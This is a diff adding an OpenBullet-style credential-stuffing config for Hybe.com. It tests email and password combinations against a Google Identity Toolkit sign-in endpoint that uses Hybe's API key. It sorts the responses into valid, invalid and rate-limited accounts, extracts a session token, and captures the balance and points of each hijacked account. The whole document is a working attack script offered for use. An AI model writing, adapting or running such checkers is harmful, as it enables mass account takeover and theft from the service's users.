@@ -1,0 +1,92 @@
+[SETTINGS]
+{
+  "Name": "Hybe.com",
+  "SuggestedBots": 1,
+  "MaxCPM": 0,
+  "LastModified": "2021-11-19T23:39:53.4825435+08:00",
+  "AdditionalInfo": "",
+  "Author": "HarryV5#4346",
+  "Version": "1.4.4 [Anomaly]",
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "EncodeData": false,
+  "AllowedWordlist1": "",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "CaptchaUrl": "",
+  "Base64": "",
+  "Grayscale": false,
+  "RemoveLines": false,
+  "RemoveNoise": false,
+  "Dilate": false,
+  "Threshold": 1.0,
+  "DiffKeep": 0.0,
+  "DiffHide": 0.0,
+  "Saturate": false,
+  "Saturation": 0.0,
+  "Transparent": false,
+  "Contour": false,
+  "OnlyShow": false,
+  "ContrastGamma": false,
+  "Contrast": 1.0,
+  "Gamma": 1.0,
+  "Brightness": 1.0,
+  "RemoveLinesMin": 0,
+  "RemoveLinesMax": 0,
+  "Crop": false,
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+REQUEST POST "https://identitytoolkit.googleapis.com/v1/accounts:signInWithPassword?key=AIzaSyCAv3D6iwDrDRbrCTyUyehrqlq1QGtUeTg" 
+  CONTENT "{\"returnSecureToken\":true,\"email\":\"<USER>\",\"password\":\"<PASS>\"}" 
+  CONTENTTYPE "application/json" 
+  HEADER "accept: */*" 
+  HEADER "accept-encoding: gzip, deflate, br" 
+  HEADER "accept-language: en-US,en;q=0.9" 
+  HEADER "content-length: 78" 
+  HEADER "content-type: application/json" 
+  HEADER "origin: https://hybe.com" 
+  HEADER "user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36" 
+
+KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "EMAIL_NOT_FOUND" 
+    KEY "INVALID_PASSWORD" 
+  KEYCHAIN Success OR 
+    KEY "\"idToken\": " 
+  KEYCHAIN Ban OR 
+    KEY "TOO_MANY_ATTEMPTS_TRY_LATER " 
+    KEY "<RESPONSECODE>" Contains "403" 
+
+PARSE "<SOURCE>" LR "\"idToken\": \"" "\"" -> VAR "t" 
+
+REQUEST GET "https://api.hybe.com/me/users/session" 
+  
+  HEADER "accept: */*" 
+  HEADER "accept-encoding: gzip, deflate, br" 
+  HEADER "accept-language: en-US,en;q=0.9" 
+  HEADER "origin: https://hybe.com" 
+  HEADER "user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36" 
+  HEADER "x-session-token: <t>" 
+
+KEYCHECK BanOnToCheck=FALSE 
+  KEYCHAIN Custom "FREE" OR 
+    KEY "balance\":0," 
+
+PARSE "<SOURCE>" LR "balance\":" "," CreateEmpty=FALSE -> CAP "Balance" "$" "" 
+
+PARSE "<SOURCE>" LR "pointsBalance\":" "," CreateEmpty=FALSE -> CAP "Points Balance" 
+
